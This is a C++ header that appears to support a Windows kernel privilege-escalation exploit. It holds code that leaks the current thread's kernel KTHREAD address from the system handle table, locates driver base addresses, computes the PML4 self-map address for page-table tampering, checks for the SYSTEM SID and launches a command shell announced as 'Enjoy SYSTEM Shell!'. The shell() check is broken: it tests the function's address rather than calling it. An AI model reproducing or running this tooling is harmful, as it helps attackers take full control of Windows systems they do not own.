#pragma once

#include <Windows.h>
#include <stdio.h>
#include <winternl.h>
#include <Psapi.h>
#include <sddl.h>

#define STATUS_INFO_LENGTH_MISMATCH ((LONG)0xC0000004)

#define ObjectThreadType 0x08

PVOID getKTHREAD();
LPVOID GetBaseAddr(LPCWSTR drvname);
ULONGLONG get_pml4_address_64(ULONGLONG pte_start);
BOOL IsRunningAsSystem();
void debug(const char* format, ...);
BOOL LaunchCommandPrompt(void);
void shell();




// accept format string
void debug(const char* format, ...) {
    va_list args;
    va_start(args, format);
    vprintf(format, args);
    va_end(args);
    Sleep(1000);
    DebugBreak();
}



// Correctly defined structs
typedef struct _SYSTEM_HANDLE_TABLE_ENTRY_INFO
{
    USHORT UniqueProcessId;
    USHORT CreatorBackTraceIndex;
    UCHAR ObjectTypeIndex;
    UCHAR HandleAttributes;
    USHORT HandleValue;
    PVOID Object;
    ULONG GrantedAccess;
} SYSTEM_HANDLE_TABLE_ENTRY_INFO, * PSYSTEM_HANDLE_TABLE_ENTRY_INFO;

typedef struct _SYSTEM_HANDLE_INFORMATION
{
    ULONG NumberOfHandles;
    SYSTEM_HANDLE_TABLE_ENTRY_INFO Handles[1];
} SYSTEM_HANDLE_INFORMATION, * PSYSTEM_HANDLE_INFORMATION;

// Function pointer definition
typedef NTSTATUS(WINAPI* _NtQuerySystemInformation)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
    );

PVOID getKTHREAD() {
    NTSTATUS nt_status;
    HANDLE hThread = OpenThread(THREAD_QUERY_INFORMATION, FALSE, GetCurrentThreadId());
    if (!hThread)
    {
        printf("[!] Error while opening thread handle: 0x%x\n", GetLastError());
        return NULL;
    }

    _NtQuerySystemInformation pNtQuerySystemInformation = (_NtQuerySystemInformation)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
    if (!pNtQuerySystemInformation)
    {
        printf("[!] Error while getting address of NtQuerySystemInformation: 0x%x\n", GetLastError());
        return NULL;
    }

    // Create output buffer for SystemHandleInformation
    ULONG system_handle_info_size = 0x1000;
    PSYSTEM_HANDLE_INFORMATION system_handle_info = (PSYSTEM_HANDLE_INFORMATION)malloc(system_handle_info_size);
    if (!system_handle_info) {
        printf("[!] Error while allocating memory for system handle information: 0x%x\n", GetLastError());
        return NULL;
    }
    memset(system_handle_info, 0x00, sizeof(SYSTEM_HANDLE_INFORMATION));

    // Query system information in a loop to handle size adjustments
    while ((nt_status = pNtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)0x10, system_handle_info, system_handle_info_size, NULL)) == STATUS_INFO_LENGTH_MISMATCH) {
        system_handle_info = (PSYSTEM_HANDLE_INFORMATION)realloc(system_handle_info, system_handle_info_size *= 2);
        if (!system_handle_info) {
            printf("[!] Error while reallocating memory for system handle information: 0x%x\n", GetLastError());
            return NULL;
        }
    }

    if (nt_status != 0x0) {
        printf("[!] Error while calling NtQuerySystemInformation to obtain the SystemHandleInformation: 0x%x\n", nt_status);
        return NULL;
    }

    int z = 0;
    for (unsigned int i = 0; i < system_handle_info->NumberOfHandles; i++)
    {
        if ((HANDLE)system_handle_info->Handles[i].HandleValue == hThread)
        {
            if (system_handle_info->Handles[i].ObjectTypeIndex == ObjectThreadType)
            {
                z++;
            }
        }
    }

    int array_size = z - 1;
    if (array_size < 0) {
        printf("[!] No matching thread handles found\n");
        free(system_handle_info);
        return NULL;
    }

    PVOID* kThread_array = new PVOID[array_size + 1];
    z = 0;
    for (unsigned int i = 0; i < system_handle_info->NumberOfHandles; i++)
    {
        if ((HANDLE)system_handle_info->Handles[i].HandleValue == hThread)
        {
            if (system_handle_info->Handles[i].ObjectTypeIndex == ObjectThreadType)
            {
                kThread_array[z] = system_handle_info->Handles[i].Object;
                z++;
            }
        }
    }



    PVOID kThread = kThread_array[array_size];

    // Clean up
    delete[] kThread_array;
    free(system_handle_info);

    return kThread;
}



typedef NTSTATUS(WINAPI* _NtWriteVirtualMemory)(
    _In_ HANDLE ProcessHandle,
    _In_ PVOID BaseAddress,
    _In_ PVOID Buffer,
    _In_ ULONG NumberOfBytesToWrite,
    _Out_opt_ PULONG NumberOfBytesWritten
    );

// define _ReadVirtualMemory (Not NtReadVirtualMemory)


LPVOID GetBaseAddr(LPCWSTR drvname)
{
    LPVOID drivers[1024];
    DWORD cbNeeded;
    int nDrivers, i = 0;

    if (EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) && cbNeeded < sizeof(drivers))
    {

        WCHAR szDrivers[1024];
        nDrivers = cbNeeded / sizeof(drivers[0]);
        for (i = 0; i < nDrivers; i++)
        {
            if (GetDeviceDriverBaseName(drivers[i], szDrivers, sizeof(szDrivers) / sizeof(szDrivers[0])))
            {
                if (wcscmp(szDrivers, drvname) == 0)
                {
                    return drivers[i];
                }
            }
        }
    }
    return 0;
}


ULONGLONG get_pml4_address_64(ULONGLONG pte_start)
{
    ULONGLONG pml4_start = pte_start & 0x0000fff000000000;
    pml4_start = pml4_start | (pml4_start >> 9);
    pml4_start = pml4_start | (pml4_start >> 9);
    pml4_start = pml4_start | (pml4_start >> 9);
    pml4_start = pml4_start | 0xffff000000000000;

    return pml4_start;
}


BOOL IsRunningAsSystem() {
    BOOL isSystem = FALSE;
    HANDLE hToken = NULL;
    PTOKEN_USER pTokenUser = NULL;
    DWORD szNeeded = 0;
    LPWSTR pSidString = NULL;  // Changed to LPWSTR to match ConvertSidToStringSid

    // Open the current process token
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        printf("[-] OpenProcessToken failed: %d\n", GetLastError());
        return FALSE;
    }

    // Get token information size first
    if (!GetTokenInformation(hToken, TokenUser, NULL, 0, &szNeeded) &&
        (GetLastError() != ERROR_INSUFFICIENT_BUFFER)) {
        printf("[-] GetTokenInformation failed: %d\n", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    // Allocate memory for token information
    pTokenUser = (PTOKEN_USER)LocalAlloc(LPTR, szNeeded);
    if (!pTokenUser) {
        printf("[-] LocalAlloc failed: %d\n", GetLastError());
        CloseHandle(hToken);
        return FALSE;
    }

    // Get the actual token information
    if (!GetTokenInformation(hToken, TokenUser, pTokenUser, szNeeded, &szNeeded)) {
        printf("[-] GetTokenInformation failed: %d\n", GetLastError());
        LocalFree(pTokenUser);
        CloseHandle(hToken);
        return FALSE;
    }

    // Convert SID to string
    if (!ConvertSidToStringSidW(pTokenUser->User.Sid, &pSidString)) {
        printf("[-] ConvertSidToStringSid failed: %d\n", GetLastError());
        LocalFree(pTokenUser);
        CloseHandle(hToken);
        return FALSE;
    }

    //printf("[+] SID: %ws\n", pSidString);

    // Check if the SID matches the SYSTEM account SID (S-1-5-18)
    if (wcscmp(L"S-1-5-18", pSidString) == 0) {
        isSystem = TRUE;
    }

    // Clean up resources
    LocalFree(pSidString);
    LocalFree(pTokenUser);
    CloseHandle(hToken);

    return isSystem;
}

BOOL LaunchCommandPrompt(void)
{
    STARTUPINFO si = { 0 };
    PROCESS_INFORMATION pi = { 0 };
    BOOL result = FALSE;
    WCHAR cmdPath[MAX_PATH] = L"cmd.exe";

    // Initialize the STARTUPINFO structure
    si.cb = sizeof(STARTUPINFO);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_SHOW;

    // Create the process
    result = CreateProcess(
        NULL,               // No module name (use command line)
        cmdPath,            // Command line
        NULL,               // Process handle not inheritable
        NULL,               // Thread handle not inheritable
        FALSE,              // Set handle inheritance to FALSE
        0,                  // No creation flags
        NULL,               // Use parent's environment block
        NULL,               // Use parent's starting directory
        &si,                // Pointer to STARTUPINFO structure
        &pi                 // Pointer to PROCESS_INFORMATION structure
    );

    if (result) {
        // Successfully created the process
        printf("[+] Command prompt launched successfully with PID: %lu\n", pi.dwProcessId);

        // Wait for the process to exit if needed
        // WaitForSingleObject(pi.hProcess, INFINITE);

        // Close process and thread handles
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    else {
        printf("[-] Failed to launch command prompt. Error: %lu\n", GetLastError());
    }

    return result;
}

void shell() {
    if (IsRunningAsSystem) {
        		printf("[+] Enjoy SYSTEM Shell!\n");
                system("cmd.exe");
	}
    else {
        printf(":(((((\n");
    }
}
